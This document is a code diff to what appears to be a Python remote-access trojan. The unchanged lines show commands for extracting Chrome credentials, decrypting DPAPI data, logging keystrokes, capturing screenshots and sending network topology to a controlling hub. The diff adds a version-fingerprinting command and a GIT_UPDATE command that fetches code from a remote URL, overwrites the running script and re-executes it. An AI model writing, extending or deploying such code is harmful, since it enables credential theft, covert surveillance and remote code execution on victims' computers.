@@ -2,6 +2,7 @@ import argparse
 import base64
 import ctypes
 import getpass
+import hashlib
 import importlib
 import json
 import os
@@ -78,6 +79,7 @@ except ImportError:
     PSUTIL_AVAILABLE = False
 
 REQUIRED_PACKAGES = ['pynput', 'pycryptodome', 'mss', 'Pillow', 'pyperclip']
+GITHUB_RAW = os.getenv('GITHUB_RAW', 'https://raw.githubusercontent.com/yourusername/yourrepo/main/python2.py')
 
 DRIVE_FIXED = 3
 DRIVE_REMOVABLE = 2
@@ -420,6 +422,31 @@ def report_status():
     return json.dumps(report)
 
 
+def report_version():
+    """Return the node's current script version metadata."""
+    current_file = os.path.realpath(sys.argv[0])
+    sha256_hash = 'unknown'
+    if os.path.exists(current_file):
+        try:
+            hasher = hashlib.sha256()
+            with open(current_file, 'rb') as f:
+                for chunk in iter(lambda: f.read(8192), b''):
+                    hasher.update(chunk)
+            sha256_hash = hasher.hexdigest()
+        except Exception:
+            sha256_hash = 'unavailable'
+
+    version_info = {
+        'HWID': get_hwid(),
+        'Python': platform.python_version(),
+        'Platform': f'{platform.system()} {platform.release()}',
+        'ScriptPath': current_file,
+        'ScriptModified': os.path.exists(current_file) and time.ctime(os.path.getmtime(current_file)) or 'unknown',
+        'ScriptSHA256': sha256_hash,
+    }
+    return json.dumps(version_info)
+
+
 def decrypt_dpapi(encrypted_bytes):
     """Decrypt DPAPI-protected bytes."""
     class DATA_BLOB(ctypes.Structure):
@@ -730,6 +757,9 @@ def connect_to_hub(hub_ip, port):
                     elif command == 'STATUS_REPORT':
                         client.sendall(f'STATUS:{report_status()}\n'.encode('utf-8'))
                         client.sendall(b'V_PULSE_EOF\n')
+                    elif command == 'GET_VERSION':
+                        client.sendall(f'VERSION:{report_version()}\n'.encode('utf-8'))
+                        client.sendall(b'V_PULSE_EOF\n')
                     elif command == 'DESKTOP_CAPTURE':
                         capture_desktop_screenshot(client)
                     elif command == 'SCREENSHOT':
@@ -839,6 +869,24 @@ def connect_to_hub(hub_ip, port):
                         send_atomic_data(client, 'TOPOLOGY', get_arp_table().encode('utf-8'), 'arp.txt')
                     elif command == 'EXTRACT_CREDENTIALS':
                         send_atomic_data(client, 'CREDENTIALS', extract_chrome_credentials(), 'chrome_credentials.txt')
+                    elif command == 'GIT_UPDATE':
+                        try:
+                            import requests
+                            if not GITHUB_RAW:
+                                raise ValueError('GITHUB_RAW is not configured')
+
+                            r = requests.get(GITHUB_RAW, timeout=15)
+                            if r.status_code != 200:
+                                raise RuntimeError(f'Update download failed: HTTP {r.status_code}')
+
+                            current_file = os.path.realpath(sys.argv[0])
+                            with open(current_file, 'w', encoding='utf-8') as f:
+                                f.write(r.text)
+
+                            send_atomic_data(client, 'LOG', 'Mutation_Complete', 'log.txt')
+                            os.execv(sys.executable, [sys.executable] + sys.argv)
+                        except Exception as e:
+                            send_atomic_data(client, 'ERROR', str(e), 'err.txt')
                     elif command == 'GET_KEYS':
                         if not PYNPUT_AVAILABLE:
                             client.sendall(b'DEPENDENCY_MISSING: pynput\n')
